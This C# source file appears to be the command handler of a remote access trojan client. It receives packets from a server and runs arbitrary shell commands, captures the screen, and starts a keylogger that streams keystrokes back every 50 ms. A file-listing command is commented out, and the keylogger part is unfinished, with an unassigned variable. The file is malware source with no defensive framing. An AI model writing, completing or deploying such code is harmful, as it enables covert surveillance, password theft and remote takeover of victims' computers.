using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SharedLibrary;
using System.Timers;

namespace Client
{
    class CommandHandler
    {
        private ServerConnection _connection;

        private Timer timer;
        private InputManagerKeylogger input;
        public bool Running = false;

        KeyloggerService keyloggerUpdate;

        public CommandHandler(ServerConnection connection)
        {
            _connection = connection;

            timer = new Timer(50);
            timer.Elapsed += OnUpdate;
        }



        public void Handle(Packet packet)
        {
            switch(packet.Command)
            {
                case "CMD":
                    string result = CmdExecutor.Execute(packet.Data);
                    _connection.Send(new Packet { Command = "CMD_RESULT", Data = result });
                    break;

                case "SCREEN":
                    byte[] img = ScreenCaptureService.Capture();
                    _connection.Send(new Packet { Command = "SCREEN_RESULT", BinaryData = img });
                    break;

                case "KEYLOG_START":
                    StartTimer();

                    //still need to send the keylogs to server (and editing the class (KeyloggerService) to return the keylogs) here .
                    break;
                
                case "KEYLOG_STOP":
                    StopTimer();
                    _connection.Send(new Packet { Command = "KEYLOG_STOP_RESULT", Data = "Keylogger has been stoped!" });
                    break;

                case "FILES":
                  //  string files = FileManager.GetFiles("D:\\");
                    //_connection.Send(new Packet { Command = "FILES_RESULT", Data = files });
                    break;
            }
        }

        public void StartTimer()
        {
            Running = true;
            timer.Start();
        }

        public void StopTimer()
        {
            Running = false;
            timer.Stop();
        }

        private void OnUpdate(object sender, ElapsedEventArgs e)
        {

            if (!Running) return;

            string keyloggerResult;

           //keyloggerResult = keyloggerUpdate.UpdateLogs();


            _connection.Send(new Packet { Command = "KEYLOG_RESULT", Data = keyloggerResult }); // will not hang the program because 50 ms sending ???
        }


    }
}
